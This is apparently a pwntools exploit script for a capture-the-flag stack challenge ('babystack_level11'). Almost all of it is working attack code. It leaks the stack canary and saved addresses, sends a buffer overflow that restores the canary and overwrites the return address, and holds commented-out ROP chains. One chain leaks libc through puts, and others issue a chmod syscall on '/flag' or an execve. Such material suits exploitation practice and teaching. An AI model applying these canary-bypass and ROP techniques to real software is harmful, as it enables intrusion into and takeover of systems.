#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../../../challenge/babystack_level2
from pwn import *
from struct import pack
# Set up pwntools for the correct architecture
exe = context.binary = ELF('../../../challenge/babystack_level11')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def leak_libc():
    '''
    00000000004010d0 <puts@plt>:
  4010d0:       f3 0f 1e fa             endbr64 
  4010d4:       f2 ff 25 45 2f 00 00    bnd jmpq *0x2f45(%rip)        # 404020 <puts@GLIBC_2.2.5>
    '''
    # puts(404020)
    # rop -> rdi = 0x404020
    pop_rdi = p64(0x401553)
    puts_value = p64(0x404020)
    puts_plt = p64(0x4010d0)
    chain = pop_rdi+puts_value+puts_plt
    return chain


def rop(libc_base,buff_address):
    rsi = [libc_base+0x2601f,4]
    rax = [libc_base+0x36174,90]
    rdi = [libc_base+0x23b6a,buff_address-0x2b0]
    syscall = [libc_base+0x2284d]
    chain = b''.join(map(p64,rdi+rsi+rax+syscall))
    
    # rdi = [libc_base+0x23b6a,libc_base+0x1b45bd]
    # rsi = [libc_base+0x2601f,0]
    # rdx = [libc_base+0x13efe1]
    # rax = [libc_base+0x36174,0x3b]
    # syscall = [libc_base+0x2284d]
    # chain = b''.join(map(p64,rdi+rsi+rdx+rax+syscall))
    return chain

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()



# io.recvuntil(b'libc is located at ')
# libc_system = int(io.recvline(keepends=False),16)
# print("libc_system",hex(libc_system))
# /usr/lib/x86_64-linux-gnu/libc.so.6
# /usr/lib/x86_64-linux-gnu/ld-2.31.so

'''
objdump -d babystack | less
00000000004010f0 <puts@plt>:
  4010f0:       f3 0f 1e fa             endbr64 
  4010f4:       f2 ff 25 25 2f 00 00    bnd jmpq *0x2f25(%rip)        # 404020 <puts@GLIBC_2.2.5>
  4010fb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

objdump -T libc.so.6 | less
0000000000084420 g    DF .text  00000000000001dc  GLIBC_2.2.5 _IO_puts

'''


io.recvuntil(b'base pointer rbp: ')
bp = int(io.recvline(keepends=False),16)
# print(hex(bp))

# io.sendline(hex(bp+8))
# io.recvuntil(b'is: ')
# ret_value = int(io.recvline(keepends=False),16)
# print('ret',hex(ret_value))


io.sendline(hex(bp-8))
io.recvuntil(b'is: ')
can_value = int(io.recvline(keepends=False),16)
print('can',hex(can_value))

# puts_value = int(io.recvline(keepends=False),16)
# print('put',hex(puts_value))

# libc_base = puts_value - 0x84420
# print("libc_base",hex(libc_base))

io.recvuntil(b'stored: ')
buffer_address = int(io.recvline(keepends=False),16)
# print(hex(buffer_address))

exploit = b'a'*(bp-buffer_address-8)+p64(can_value)+b'a'*8+p16(0x400e)
io.send(exploit)

io.sendline(hex(bp+40))
io.recvuntil(b'is: ')
main_value = int(io.recvline(keepends=False),16)
print('main',hex(main_value))

exploit = b'a'*(bp-buffer_address-8)+p64(can_value)+b'a'*8+p64(main_value-79)
io.send(exploit)



# 0x000000000002400e : call rbx

'''
    4014bf:       e8 3c fc ff ff          callq  401100 <printf@plt>
  4014c4:       48 8d 85 d0 fc ff ff    lea    -0x330(%rbp),%rax
  4014cb:       ba 10 04 00 00          mov    $0x410,%edx
  4014d0:       48 89 c6                mov    %rax,%rsi
  4014d3:       bf 00 00 00 00          mov    $0x0,%edi
  4014d8:       e8 63 fc ff ff          callq  401140 <read@plt>
'''

# reads = 0x4014cc
# pop_rbp = 0x40121d
# print(bp-buffer_address+8)
# exploit = b'a'*(bp-buffer_address+8)+leak_libc()
# # +p64(pop_rbp)+p64(buffer_address)+p64(reads)
# print(exploit)
# io.send(exploit)
# print(io.recvline())
# leaked_bytes = io.recvline(keepends=False)
# leaked_puts = u64(leaked_bytes.ljust(8,b'\0'))
# print('leaked_b',leaked_bytes)
# print('leaked_p',hex(leaked_puts))

# libc_base = leaked_puts - 0x84420
# print(hex(libc_base))
# print((bp-buffer_address+8-len(b"/flag\0")))
# exploit_2 = b"/flag\0"+b'a'*(bp-buffer_address+8-len(b"/flag\0"))+rop(libc_base,buffer_address)

# io.send(exploit_2)


io.interactive()

